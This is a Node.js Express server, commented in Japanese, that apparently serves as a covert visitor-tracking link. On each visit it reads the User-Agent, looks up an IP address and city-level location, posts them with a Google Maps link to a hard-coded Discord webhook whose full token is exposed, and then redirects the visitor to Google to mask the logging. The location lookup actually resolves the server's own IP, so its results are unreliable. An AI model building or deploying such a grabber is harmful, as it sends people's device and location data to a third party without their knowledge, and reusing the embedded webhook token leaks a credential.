import express from 'express';
import os from 'os';
import fetch from 'node-fetch';

const app = express();
const PORT = 3000;
const webhookURL = 'https://discord.com/api/webhooks/1377252474037076099/w7U5xd5AeYq-jotDMYQZjxIoL6g02e4wdUAeMP9dYvtPDoao6EIEh-LmjcXfggoZSpSx';

// ローカルIP取得
function getLocalIp() {
  const nets = os.networkInterfaces();
  for (const name of Object.keys(nets)) {
    for (const net of nets[name]) {
      if (net.family === 'IPv4' && !net.internal) {
        return net.address;
      }
    }
  }
  return 'IPアドレスが見つかりませんでした';
}

// User-AgentからOS判別
function getDeviceType(userAgent) {
  if (!userAgent) return '不明';
  if (userAgent.includes('Windows')) return 'Windows';
  if (userAgent.includes('Macintosh')) return 'Mac';
  if (userAgent.match(/iPhone|iPad|iPod/)) return 'iOSデバイス';
  if (userAgent.includes('Android')) return 'Androidデバイス';
  if (userAgent.includes('Linux')) return 'Linux';
  return '不明';
}

app.get('/', async (req, res) => {
  const ip = getLocalIp();
  const userAgent = req.headers['user-agent'] || '';
  const deviceType = getDeviceType(userAgent);

  let location = '住所情報が取得できませんでした';
  let lat = null;
  let lon = null;

  try {
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    const publicIP = ipData.ip;

    const geoResponse = await fetch(`http://ip-api.com/json/${publicIP}?lang=ja`);
    const geoData = await geoResponse.json();

    if (geoData.status === 'success') {
      location = `${geoData.regionName}, ${geoData.city}`;
      lat = geoData.lat;
      lon = geoData.lon;
    }
  } catch (err) {
    console.error('住所取得エラー:', err);
  }

  // GoogleマップURL（画像なし）
  const googleMapUrl = lat && lon ? `https://www.google.com/maps/search/?api=1&query=${lat},${lon}` : null;

  // Discordメッセージ作成
  const message = {
    content: `📥 アクセスがありました！\n🔹 ローカルIP: ${ip}\n🔹 デバイス: ${deviceType}\n🔹 住所(市まで): ${location}`,
    embeds: []
  };

  if (googleMapUrl) {
    message.embeds.push({
      title: 'Googleマップで表示',
      url: googleMapUrl,
      description: location,
      color: 0x00ff00
    });
  }

  try {
    const response = await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(message)
    });

    const result = await response.text();
    console.log('Discordからのレスポンス:', result);

    res.redirect('https://www.google.co.jp');
  } catch (error) {
    console.error('Webhook送信エラー:', error);
    res.status(500).send('❌ Discord送信中にエラーが発生しました。');
  }
});

app.listen(PORT, () => {
  console.log(`http://localhost:${PORT} で起動中`);
});
